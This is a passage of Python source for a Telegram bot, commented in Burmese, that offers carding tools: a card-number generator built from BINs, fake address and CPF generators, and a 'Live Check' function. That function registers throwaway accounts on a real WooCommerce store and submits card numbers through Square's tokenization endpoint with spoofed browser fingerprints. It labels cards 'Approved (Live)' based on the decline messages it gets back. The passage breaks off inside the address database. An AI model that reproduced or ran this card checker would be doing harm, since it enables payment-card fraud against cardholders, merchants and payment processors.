import telebot
from telebot.types import BotCommand, ReplyKeyboardMarkup, KeyboardButton
import os
import random
import requests
import re
import time
import hashlib
from flask import Flask
from threading import Thread

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN မရှိပါ။")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

# --- Tracking All Users ---
ALL_USERS = set()
ALL_USERS_FILE = "all_users.txt"

def load_all_users():
    if os.path.exists(ALL_USERS_FILE):
        with open(ALL_USERS_FILE, "r") as f:
            for line in f:
                if line.strip().isdigit():
                    ALL_USERS.add(int(line.strip()))

def add_user(user_id):
    if user_id not in ALL_USERS:
        ALL_USERS.add(user_id)
        with open(ALL_USERS_FILE, "a") as f:
            f.write(f"{user_id}\n")

load_all_users()

# --- Admin Ban System (Blacklist) ---
ADMIN_ID = 1847021130
BANNED_USERS = set()
BAN_FILE = "banned.txt"

def load_banned():
    if os.path.exists(BAN_FILE):
        with open(BAN_FILE, "r") as f:
            for line in f:
                if line.strip().isdigit():
                    BANNED_USERS.add(int(line.strip()))

def save_banned():
    with open(BAN_FILE, "w") as f:
        for uid in BANNED_USERS:
            f.write(f"{uid}\n")

load_banned()

def is_banned(user_id):
    return user_id in BANNED_USERS

# --- Giveaway System Data ---
GIVEAWAY_PARTICIPANTS = []
GIVEAWAY_PRIZES = [
    "Kpay 10000ks", "Wave 10000ks", "Peacock TV Premium 1month",
    "Cookie group join", "1 Vpn 3months", "Veee Vpn 3months",
    "Norton vpn 1month", "1vpn 1month", "Tidal music 1month",
    "Deezer music 1month", "Netflix login link Bot Vip", 
    "Us Number Telegram New Account"
]

# --- Main Keyboard Menu ---
def get_main_menu(user_id=None):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("🔐 Gen BIN"), KeyboardButton("💳 Live Check"))
    markup.add(KeyboardButton("👉 Fake Address"), KeyboardButton("ℹ️ IBAN Gen"))
    markup.add(KeyboardButton("©️ CPF Gen"), KeyboardButton("👤 My Info"))
    
    if user_id == ADMIN_ID:
        markup.add(KeyboardButton("🎁 Giveaway Admin"))
        
    return markup

def setup_bot_commands():
    commands = [
        BotCommand("start", "🚀 Start Bot Menu")
    ]
    try:
        bot.set_my_commands(commands)
    except Exception as e:
        print(f"Menu setup error: {e}")

def check_cancel(message):
    text = message.text
    menu_buttons = ["🔐 Gen BIN", "💳 Live Check", "👉 Fake Address", "ℹ️ IBAN Gen", "©️ CPF Gen", "👤 My Info", "🎁 Giveaway Admin"]
    if text in menu_buttons or text.startswith('/'):
        try:
            handle_menu_buttons(message)
        except NameError:
            pass 
        return True
    return False

# --- Admin Commands ---
@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.split()[1])
        if uid == ADMIN_ID:
            bot.reply_to(message, "❌ Admin အကောင့်ကို Ban ၍မရပါ။")
            return
        BANNED_USERS.add(uid)
        save_banned()
        bot.reply_to(message, f"🚫 User ID <code>{uid}</code> ကို အသုံးပြုခွင့် ပိတ် (Ban) လိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ <b>အသုံးပြုနည်း:</b> <code>/ban user_id</code>")

@bot.message_handler(commands=['unban'])
def cmd_unban(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        uid = int(message.text.split()[1])
        BANNED_USERS.discard(uid)
        save_banned()
        bot.reply_to(message, f"✅ User ID <code>{uid}</code> ကို Ban မှ ပြန်ဖွင့်ပေးလိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ <b>အသုံးပြုနည်း:</b> <code>/unban user_id</code>")

@bot.message_handler(commands=['banned'])
def cmd_banned_list(message):
    if message.from_user.id != ADMIN_ID: return
    if not BANNED_USERS:
        bot.reply_to(message, "🟢 Banned လုပ်ထားသော User မရှိပါ။")
        return
    banned_str = "\n".join([f"<code>{u}</code>" for u in BANNED_USERS])
    bot.reply_to(message, f"🚫 <b>Banned Users:</b>\n\n{banned_str}")

@bot.message_handler(commands=['users'])
def cmd_users_list(message):
    if message.from_user.id != ADMIN_ID: return
    if not ALL_USERS:
        bot.reply_to(message, "🟢 အသုံးပြုသူ မရှိသေးပါ။")
        return
        
    users_list = list(ALL_USERS)
    total = len(users_list)
    
    display_users = users_list[-100:]
    users_str = "\n".join([f"<code>{u}</code>" for u in display_users])
    
    if total > 100:
        users_str += f"\n\n<i>... and {total - 100} more users.</i>"
        
    bot.reply_to(message, f"👥 <b>Total Bot Users:</b> <code>{total}</code>\n\n{users_str}")

@bot.message_handler(commands=['cmd', 'help'])
def cmd_admin_menu(message):
    if message.from_user.id != ADMIN_ID: return 
    text = (
        "🛠 <b>Admin Commands List</b>\n\n"
        "👥 /users - Show All Users List\n"
        "🚫 /ban user_id - Ban User\n"
        "✅ /unban user_id - Unban User\n"
        "🛑 /banned - Show Banned Users\n\n"
        "🔐 /gen - BIN Generator\n"
        "💳 /chk - Live Check CC\n"
        "👉 /fake - Address Generator\n"
        "ℹ️ /iban - IBAN Generator\n"
        "©️ /cpf - CPF Generator\n"
        "👤 /me - My Info"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu(message.from_user.id))

@bot.message_handler(commands=['start'])
def cmd_start(message):
    add_user(message.from_user.id) 
    if is_banned(message.from_user.id): return
    bot.reply_to(message, "🛠 <b>Bot Main Menu</b>\nအောက်ပါ ခလုတ်များကို နှိပ်၍ အသုံးပြုပါ။ Gen နှင့် Address သည် Format မှန်က တန်းပို့နိုင်သည်။ (ဥပမာ-524554|xx|xx|xxx နှင့် us/uk/de/etc....)", reply_markup=get_main_menu(message.from_user.id))

# ==========================================
# CC Checker Logic (Square Auth Integration)[span_5](start_span)[span_5](end_span)
# ==========================================
def ego(data):
    return hashlib.md5(str(data).encode()).hexdigest()

def get_bin_info_str(cc):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
        if res.status_code == 200:
            d = res.json()
            return f"{d.get('brand','-')} - {d.get('type','-')} - {d.get('bank','-')} - {d.get('country_name','-')}"
    except:
        pass
    return "Unknown BIN"

def square_check(cc, mes, ano, cvv):
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    
    f = random.choice(fnames)
    l = random.choice(lnames)
    mail = f"{f}.{l}{random.randint(10, 999)}@{random.choice(domains)}"
    mod = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
    u = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    
    bin_str = get_bin_info_str(cc)
    r = requests.Session()
    
    try:
        resp1 = r.get('https://underthedivi.com/my-account/', headers={'User-Agent': u}, timeout=15)
        x = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', resp1.text)
        xx = x.group(1) if x else None
        
        if not xx: return f"🔴 <b>#Dead (Site Error / No Nonce 1)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"

        headers_reg = {
            'authority': 'underthedivi.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://underthedivi.com',
            'referer': 'https://underthedivi.com/my-account/',
            'user-agent': u,
        }
        data_reg = {'email': mail, 'password': mod, 'woocommerce-register-nonce': xx, '_wp_http_referer': '/my-account/', 'register': 'Register'}
        r.post('https://underthedivi.com/my-account/', headers=headers_reg, data=data_reg, timeout=15)

        site_resp = r.get('https://underthedivi.com/my-account/add-payment-method/', headers={'User-Agent': u}, timeout=15)
        xox = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', site_resp.text)
        xxx = xox.group(1) if xox else None
        
        if not xxx: return f"🔴 <b>#Dead (Gate Error / No Nonce 2)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"

        params_sq = {'_': str(int(time.time() * 1000)) + '.3772', 'version': '1.83.9'}
        headers_opt = {
            'authority': 'pci-connect.squareup.com',
            'access-control-request-headers': 'content-type',
            'access-control-request-method': 'POST',
            'origin': 'https://web.squarecdn.com',
            'user-agent': u,
        }
        r.options('https://pci-connect.squareup.com/v2/card-nonce', params=params_sq, headers=headers_opt)

        headers_token = {
            'authority': 'pci-connect.squareup.com',
            'accept': 'application/json',
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://web.squarecdn.com',
            'referer': 'https://web.squarecdn.com/',
            'user-agent': u,
        }
        json_data = {
            'analytics': {
                'fingerprints': [
                    {
                        'components': f'{{"user_agent":"{u}","language":"fr-FR","resolution":[889,400],"available_resolution":[889,400],"timezone_offset":-120,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}}',
                        'fingerprint': ego('0fa8d9047fd8730c5f29211470ea6ae9'),
                        'version': 'fingerprint-v1',
                    },
                    {
                        'components': '{"language":"fr-FR","resolution":[889,400],"available_resolution":[889,400],"timezone_offset":-120,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
                        'fingerprint': ego('9f8c15efb62db3caf1ad5d92b3f3f647'),
                        'version': 'fingerprint-v1-sans-ua',
                    },
                ],
                'timezone': '-120',
                'website_url': 'https://underthedivi.com/',
            },
            'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
            'instance_id': '8ea96ffb-c42e-40f9-bdd9-9777ca088075',
            'location_id': '6JKR6RP4CBRJB',
            'payment_method_tracking_id': '5f384b71-43e6-1464-a7c6-ace6ca18770e',
            'session_id': '2DXeprvSMW9cOmqP6ASKKVfr7u63p7Ss__myRu3n4Dyh494PbhWaU58mkbr2FFfKj9iC5Eo_nCUJ4CpToS6XG6WjSyphSgTzccQO6TeKbEAdMJhRgdjtH_u2wJFCm9Z0if0Vuq39xg==',
            'card_data': {
                'cvv': str(cvv),
                'exp_month': int(mes),
                'exp_year': int(ano),
                'number': str(cc),
            },
            'pow_counter': 366,
        }
        
        resp_token = r.post('https://pci-connect.squareup.com/v2/card-nonce', params=params_sq, headers=headers_token, json=json_data, timeout=15)
        xego = resp_token.json().get('card_nonce')
        
        if not xego: return f"🔴 <b>#Dead (Tokenize Fail)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"

        headers_pay = {
            'authority': 'underthedivi.com',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://underthedivi.com',
            'referer': 'https://underthedivi.com/my-account/add-payment-method/',
            'user-agent': u,
        }
        data_pay = {
            'payment_method': 'square_credit_card',
            'wc-square-credit-card-payment-nonce': xego,
            'wc-square-credit-card-payment-postcode': '',
            'wc-square-credit-card-amount': '',
            'wc-square-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': xxx,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        resp_final = r.post('https://underthedivi.com/my-account/add-payment-method/', headers=headers_pay, data=data_pay, timeout=20)

        try:
            data_json = resp_final.json()
            if 'error' in data_json:
                err_msg = data_json.get('error', {}).get('message', str(data_json))
                if any(x in err_msg.lower() for x in ["insufficient", "zip", "cvv", "verification"]):
                    return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_msg}</code>"
                return f"🔴 <b>#Declined</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_msg}</code>"
            else:
                return f"🟢 <b>#Approved (Added Successfully)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}"
        except:
            match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', resp_final.text, re.DOTALL)
            if match:
                err_msg = match.group(1).strip()
                err_clean = re.sub(r'<[^>]+>', '', err_msg)
                if any(x in err_clean.lower() for x in ["insufficient", "zip", "cvv", "verification", "successfully"]):
                    return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_clean}</code>"
                return f"🔴 <b>#Declined</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>{err_clean}</code>"
            elif "successfully" in resp_final.text.lower():
                return f"🟢 <b>#Approved (Live)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>Added successfully</code>"
            else:
                return f"🔴 <b>#Declined (Dead)</b>\n<code>{cc}|{mes}|{ano}|{cvv}</code>\n<b>Info:</b> {bin_str}\n<b>Msg:</b> <code>Unknown/Dead</code>"

    except Exception as e:
        return f"⚠️ <b>Error Check (Timeout):</b> <code>{cc}|{mes}|{ano}|{cvv}</code>"

# ==========================================
# Giveaway Private Chat Commands (Bot DM)[span_6](start_span)[span_6](end_span)
# ==========================================
@bot.message_handler(commands=['add'])
def gw_add_user(message):
    if message.from_user.id != ADMIN_ID: return
    if len(message.text.split(" ", 1)) > 1:
        name = message.text.split(" ", 1)[1]
        GIVEAWAY_PARTICIPANTS.append(name)
        bot.reply_to(message, f"✅ လူစာရင်း ထည့်သွင်းပြီးပါပြီ: {name}\nစုစုပေါင်း: {len(GIVEAWAY_PARTICIPANTS)} ယောက်")
    else:
        bot.reply_to(message, "အသုံးပြုပုံ: <code>/add နာမည် (ဂဏန်း)</code>")

@bot.message_handler(commands=['clearusers'])
def gw_clear_users(message):
    if message.from_user.id != ADMIN_ID: return
    GIVEAWAY_PARTICIPANTS.clear()
    bot.reply_to(message, "🗑 လူစာရင်း အားလုံးကို ဖျက်လိုက်ပါပြီ။")

@bot.message_handler(commands=['addprize'])
def gw_add_prize(message):
    if message.from_user.id != ADMIN_ID: return
    if len(message.text.split(" ", 1)) > 1:
        prize = message.text.split(" ", 1)[1]
        GIVEAWAY_PRIZES.append(prize)
        bot.reply_to(message, f"✅ ဆုအသစ် ထည့်သွင်းပြီးပါပြီ: {prize}\nစုစုပေါင်း ဆု: {len(GIVEAWAY_PRIZES)} မျိုး")
    else:
        bot.reply_to(message, "အသုံးပြုပုံ: <code>/addprize ဆုအမည်</code>")

@bot.message_handler(commands=['clearprizes'])
def gw_clear_prizes(message):
    if message.from_user.id != ADMIN_ID: return
    GIVEAWAY_PRIZES.clear()
    bot.reply_to(message, "🗑 ဆုစာရင်း အားလုံးကို ဖျက်လိုက်ပါပြီ။")

@bot.message_handler(commands=['gusers', 'prizes', 'pick'])
def gw_dm_view_commands(message):
    if message.from_user.id != ADMIN_ID: return
    cmd = message.text.split()[0].lower()
    
    if cmd == '/gusers':
        if not GIVEAWAY_PARTICIPANTS:
            bot.reply_to(message, "လူစာရင်း လွတ်နေပါသည်။")
        else:
            text = "<b>လက်ရှိ ပါဝင်သူများ:</b>\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(GIVEAWAY_PARTICIPANTS)])
            bot.reply_to(message, text)
            
    elif cmd == '/prizes':
        if not GIVEAWAY_PRIZES:
            bot.reply_to(message, "ဆုစာရင်း လွတ်နေပါသည်။")
        else:
            text = "<b>လက်ရှိ ဆုစာရင်းများ:</b>\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(GIVEAWAY_PRIZES)])
            bot.reply_to(message, text)
            
    elif cmd == '/pick':
        if not GIVEAWAY_PARTICIPANTS:
            bot.reply_to(message, "ပါဝင်သူစာရင်း မရှိသေးပါ။ Forward အရင်လုပ်ပေးပါ။")
            return
        if not GIVEAWAY_PRIZES:
            bot.reply_to(message, "ဆုစာရင်း မရှိသေးပါ။")
            return

        shuffled_participants = random.sample(GIVEAWAY_PARTICIPANTS, len(GIVEAWAY_PARTICIPANTS))
        shuffled_prizes = random.sample(GIVEAWAY_PRIZES, len(GIVEAWAY_PRIZES))
        winners_dict = {p: [] for p in shuffled_participants}
        for i, prize in enumerate(shuffled_prizes):
            winner = shuffled_participants[i % len(shuffled_participants)]
            winners_dict[winner].append(prize)

        text = "🎉 <b>Giveaway ပေါက်မဲစာရင်း</b> 🎉\n\n"
        for winner, won_prizes in winners_dict.items():
            text += f"👤 <b>{winner}</b>\n"
            for p in won_prizes:
                text += f" ➔ 🎁 {p}\n"
            text += "\n"
        text += "ကံထူးရှင်များ ဂုဏ်ယူပါတယ်ခင်ဗျာ! 🥳"
        bot.reply_to(message, text, parse_mode="HTML")

# --- Forwarded Message Handler (Giveaway Auto Add)[span_7](start_span)[span_7](end_span) ---
@bot.message_handler(func=lambda m: m.forward_date is not None)
def handle_forwarded_message(message):
    if message.from_user.id != ADMIN_ID: 
        return

    name = None
    if message.forward_sender_name:
        name = message.forward_sender_name
    elif message.forward_from:
        name = message.forward_from.first_name
        if message.forward_from.last_name:
            name += f" {message.forward_from.last_name}"
    
    if not name:
        name = "Unknown User"

    user_text = message.text or message.caption or ""
    entry = f"{name} ({user_text})" if user_text else name
    
    GIVEAWAY_PARTICIPANTS.append(entry)
    bot.reply_to(message, f"✅ စာရင်းဝင်သွားပါပြီ ➔ <b>{entry}</b>", parse_mode="HTML")


# ==========================================
# Giveaway Channel Post Commands[span_8](start_span)[span_8](end_span)
# ==========================================
@bot.channel_post_handler(commands=['gusers', 'prizes', 'pick'])
def gw_channel_commands(message):
    chat_id = message.chat.id
    text_cmd = message.text.split()[0].lower()

    if text_cmd == '/gusers':
        if not GIVEAWAY_PARTICIPANTS:
            bot.send_message(chat_id, "လူစာရင်း လွတ်နေပါသည်။")
        else:
            res = "<b>လက်ရှိ ပါဝင်သူများ:</b>\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(GIVEAWAY_PARTICIPANTS)])
            bot.send_message(chat_id, res, parse_mode="HTML")
            
    elif text_cmd == '/prizes':
        if not GIVEAWAY_PRIZES:
            bot.send_message(chat_id, "ဆုစာရင်း လွတ်နေပါသည်။")
        else:
            res = "<b>လက်ရှိ ဆုစာရင်းများ:</b>\n" + "\n".join([f"{i+1}. {p}" for i, p in enumerate(GIVEAWAY_PRIZES)])
            bot.send_message(chat_id, res, parse_mode="HTML")
            
    elif text_cmd == '/pick':
        if not GIVEAWAY_PARTICIPANTS:
            bot.send_message(chat_id, "ပါဝင်သူစာရင်း မရှိသေးပါ။ Admin မှ အရင် Add ပေးပါ။")
        elif not GIVEAWAY_PRIZES:
            bot.send_message(chat_id, "ဆုစာရင်း မရှိသေးပါ။")
        else:
            shuffled_participants = random.sample(GIVEAWAY_PARTICIPANTS, len(GIVEAWAY_PARTICIPANTS))
            shuffled_prizes = random.sample(GIVEAWAY_PRIZES, len(GIVEAWAY_PRIZES))

            winners_dict = {p: [] for p in shuffled_participants}
            for i, prize in enumerate(shuffled_prizes):
                winner = shuffled_participants[i % len(shuffled_participants)]
                winners_dict[winner].append(prize)

            res = "🎉 <b>Giveaway ပေါက်မဲစာရင်း</b> 🎉\n\n"
            for winner, won_prizes in winners_dict.items():
                res += f"👤 <b>{winner}</b>\n"
                for p in won_prizes:
                    res += f" ➔ 🎁 {p}\n"
                res += "\n"
            res += "ကံထူးရှင်များ ဂုဏ်ယူပါတယ်ခင်ဗျာ! 🥳"
            
            bot.send_message(chat_id, res, parse_mode="HTML")

    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass


# ==========================================
# Direct Functions for Info & CPF[span_9](start_span)[span_9](end_span)
# ==========================================
def cmd_me(message):
    user = message.from_user
    text = (
        f"🔍 <b>Telegram Account Info</b>\n\n"
        f"👤 Name: <code>{user.first_name} {user.last_name or ''}</code>\n"
        f"🆔 User ID: <code>{user.id}</code>\n"
        f"🌐 Username: <code>@{user.username or 'None'}</code>\n"
        f"⚙️ Language: <code>{user.language_code or 'N/A'}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu(message.from_user.id))

def cmd_cpf(message):
    first_names = ["Anderson", "Carlos", "Lucas", "Mariana", "Gabriel", "Beatriz", "Rafael", "Juliana", "Thiago", "Camila", "Bruno", "Amanda"]
    last_names = ["De Souza", "Silva", "Santos", "Oliveira", "Lima", "Ferreira", "Costa", "Pereira", "Alves", "Ribeiro", "Gomes"]
    places = ["Caminho Niemeyer", "Copacabana Palace", "Ipanema Beach", "Paulista Avenue", "Maracanã Stadium", "Cristo Redentor"]
    
    name = f"{random.choice(first_names)} {random.choice(last_names)}"
    cpf = f"{random.randint(100,999)}.{random.randint(100,999)}.{random.randint(100,999)}-{random.randint(10,99)}"
    place = random.choice(places)
    
    text = (
        f"👉 <b>BR 🇧🇷 CPF Generator</b>\n\n"
        f"𝗡𝗮𝗺𝗲: <code>{name}</code>\n"
        f"𝗖𝗣𝗙: <code>{cpf}</code>\n"
        f"𝗗𝗼𝗕: <code>{random.randint(1970, 2005)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}</code>\n"
        f"𝗣𝗹𝗮𝗰𝗲: <code>{place}</code>\n"
        f"𝗗𝗲𝗹𝗶𝘃𝗲𝗿𝘆: <code>Segunda ({random.randint(1,28)}/{random.randint(1,12)})</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu(message.from_user.id))

def generate_cc(message, input_text):
    arg = input_text.strip()
    sub_parts = arg.split('|')
    
    template_cc = sub_parts[0].strip()
    custom_mm = sub_parts[1].strip() if len(sub_parts) > 1 and sub_parts[1].strip() else None
    custom_yyyy = sub_parts[2].strip() if len(sub_parts) > 2 and sub_parts[2].strip() else None
    custom_cvv = sub_parts[3].strip() if len(sub_parts) > 3 and sub_parts[3].strip() else None
    
    is_amex = template_cc.startswith("34") or template_cc.startswith("37")
    target_len = 15 if is_amex else 16
    card_length = max(target_len, len(template_cc) + 1)
    cvv_length = 4 if is_amex else 3
    
    cards = []
    for _ in range(10):
        rand_digits = "".join([str(random.randint(0, 9)) for _ in range(card_length - len(template_cc))])
        full_cc = template_cc + rand_digits
        
        if custom_mm and custom_mm.lower() != 'xx':
            mm = custom_mm.zfill(2)
        else:
            mm = f"{random.randint(1, 12):02d}"
            
        if custom_yyyy and custom_yyyy.lower() not in ['xxxx', 'xx']:
            yyyy = "20" + custom_yyyy if len(custom_yyyy) == 2 else custom_yyyy
        else:
            yyyy = str(random.randint(2027, 2035))
            
        if custom_cvv and custom_cvv.lower() != 'xxx':
            cvv = custom_cvv
        else:
            cvv = "".join([str(random.randint(0, 9)) for _ in range(cvv_length)])
            
        cards.append(f"<code>{full_cc}|{mm}|{yyyy}|{cvv}</code>")
    
    bin6 = template_cc[:6]
    brand, bank, country, type_cc = "VISA", "COMMERCIAL BANK", "United States", "CREDIT"
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=3)
        if res.status_code == 200:
            data = res.json()
            brand = data.get('brand', 'VISA')
            bank = data.get('bank', 'COMMERCIAL BANK')
            country = data.get('country_name', 'United States')
            type_cc = data.get('type', 'CREDIT')
    except:
        pass

    cards_str = "\n".join(cards)
    text = (
        f"<b>𝗕𝗜𝗡 ⇾</b> <code>{template_cc}</code>\n"
        f"<b>𝗔𝗺𝗼𝘂𝗻𝘁 ⇾</b> <code>10</code>\n\n"
        f"{cards_str}\n\n"
        f"<b>𝗜𝗻𝗳𝗼:</b> <code>{brand} - {type_cc}</code>\n"
        f"<b>𝗕𝗮𝗻𝗸:</b> <code>{bank}</code>\n"
        f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> <code>{country}</code>"
    )
    bot.reply_to(message, text, reply_markup=get_main_menu(message.from_user.id))

def generate_fake_address(message, country_code):
    country_code = country_code.lower()
    if country_code == "gb":
        country_code = "uk"

    api_mapping = {"uk": "gb"}
    api_cc = api_mapping.get(country_code, country_code)
    api_supported_nats = ['au', 'br', 'ca', 'ch', 'de', 'dk', 'es', 'fi', 'fr', 'gb', 'ie', 'in', 'ir', 'mx', 'nl', 'no', 'nz', 'rs', 'tr', 'ua', 'us']
    
    if api_cc in api_supported_nats:
        try:
            req = requests.get(f"https://randomuser.me/api/?nat={api_cc}", timeout=5)
            if req.status_code == 200:
                data = req.json()['results'][0]
                fname = data['name']['first']
                lname = data['name']['last']
                street = f"{data['location']['street']['number']} {data['location']['street']['name']}"
                city = data['location']['city']
                state = data['location']['state']
                zip_code = str(data['location']['postcode'])
                phone = data['phone']
                c_name = data['location']['country']
                
                text = (
                    f"👉 <b>{c_name} Address Generator</b>\n\n"
                    f"𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: <code>{fname} {lname}</code>\n"
                    f"𝗦𝘁𝗿𝗲𝗲𝘁 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: <code>{street}</code>\n"
                    f"𝗖𝗶𝘁𝘆/𝗧𝗼wn/𝗩𝗶𝗹𝗹𝗮𝗴𝗲: <code>{city}</code>\n"
                    f"𝗦𝘁𝗮𝘁𝗲/𝗣𝗿𝗼𝘃𝗶𝗻𝗰𝗲/𝗥𝗲𝗴𝗶𝗼𝗻: <code>{state}</code>\n"
                    f"𝗣𝗼𝘀𝘁𝗮𝗹 𝗖𝗼𝗱𝗲: <code>{zip_code}</code>\n"
                    f"𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: <code>{phone}</code>\n"
                    f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{c_name}</code>"
                )
                bot.reply_to(message, text, reply_markup=get_main_menu(message.from_user.id))
                return
        except:
            pass 

    # Comprehensive Fake Address Database for all countries
    loc_database = {
        "dz": {"country": "Algeria 🇩🇿", "first": ["Amine", "Fatima"], "last": ["Benali", "Khelifi"], "streets": ["Rue Didouche"], "cities": ["Algiers"], "states": ["Algiers"], "zips": ["16000"], "phone": "+213 55123456"},
        "ar": {"country": "Argentina 🇦🇷", "first": ["Mateo", "Sofia"], "last": ["Gomez", "Fernandez"], "streets": ["Av. Corrientes"], "cities": ["Buenos Aires"], "states": ["BA"], "zips": ["1011"], "phone": "+54 9 11 1234"},
        "au": {"country": "Australia 🇦🇺", "first": ["Jack", "Charlotte"], "last": ["Smith", "Wilson"], "streets": ["Collins St"], "cities": ["Sydney"], "states": ["NSW"], "zips": ["2000"], "phone": "+61 412 345 678"},
        "bh": {"country": "Bahrain 🇧🇭", "first": ["Ali", "Zainab"], "last": ["Hassan", "Ahmed"], "streets": ["Road No 2803"], "cities": ["Manama"], "states": ["Capital"], "zips": ["317"], "phone": "+973 33123456"},
        "bd": {"country": "Bangladesh 🇧🇩", "first": ["Rahim", "Ayesha"], "last": ["Uddin", "Begum"], "streets": ["Gulshan Ave"], "cities": ["Dhaka"], "states": ["Dhaka"], "zips": ["1212"], "phone": "+880 17123456"},
        "be": {"country": "Belgium 🇧🇪", "first": ["Lucas", "Camille"], "last": ["Janssen", "Dubois"], "streets": ["Rue de la Loi"], "cities": ["Brussels"], "states": ["Brussels"], "zips": ["1000"], "phone": "+32 470 123456"},
        "br": {"country": "Brazil 🇧🇷", "first": ["Anderson", "Mariana"], "last": ["Silva", "Santos"], "streets": ["Av. Paulista"], "cities": ["São Paulo"], "states": ["SP"], "zips": ["01310"], "phone": "+55 11 91234"},
        "kh": {"country": "Cambodia 🇰🇭", "first": ["Sokha", "Vanna"], "last": ["Chan", "Seng"], "streets": ["Monivong Blvd"], "cities": ["Phnom Penh"], "states": ["Phnom Penh"], "zips": ["12000"], "phone": "+855 12 345 678"},
        "ca": {"country": "Canada 🇨🇦", "first": ["Liam", "Olivia"], "last": ["Tremblay", "Roy"], "streets": ["Yonge St"], "cities": ["Toronto"], "states": ["ON"], "zips": ["M5V 2H1"], "phone": "+1 416-555-0199"},
        "co": {"country": "Colombia 🇨🇴", "first": ["Santiago", "Valeria"], "last": ["Rodriguez", "Lopez"], "streets": ["Cra. 7"], "cities": ["Bogota"], "states": ["DC"], "zips": ["110111"], "phone": "+57 310 1234567"},
        "dk": {"country": "Denmark 🇩🇰", "first": ["Magnus", "Ida"], "last": ["Nielsen", "Jensen"], "streets": ["Strøget"], "cities": ["Copenhagen"], "states": ["Capital"], "zips": ["1050"], "phone": "+45 20 12 34 56"},
        "eg": {"country": "Egypt 🇪🇬", "first": ["Ahmed", "Nour"], "last": ["Mohamed", "Ibrahim"], "streets": ["Tahrir Square"], "cities": ["Cairo"], "states": ["Cairo"], "zips": ["11511"], "phone": "+20 10 1234 5678"},
        "fi": {"country": "Finland 🇫🇮", "first": ["Eetu", "Aino"], "last": ["Korhonen", "Virtanen"], "streets": ["Aleksanterinkatu"], "cities": ["Helsinki"], "states": ["Uusimaa"], "zips": ["00100"], "phone": "+358 40 123 4567"},
        "fr": {"country": "France 🇫🇷", "first": ["Gabriel", "Jade"], "last": ["Bernard", "Petit"], "streets": ["Champs-Élysées"], "cities": ["Paris"], "states": ["IDF"], "zips": ["75008"], "phone": "+33 6 12 34 56 78"},
        "de": {"country": "Germany 🇩🇪", "first": ["Maximilian", "Anna"], "last": ["Schmidt", "Weber"], "streets": ["Hauptstraße"], "cities": ["Berlin"], "states": ["Berlin"], "zips": ["10115"], "phone": "+49 151 1234567"},
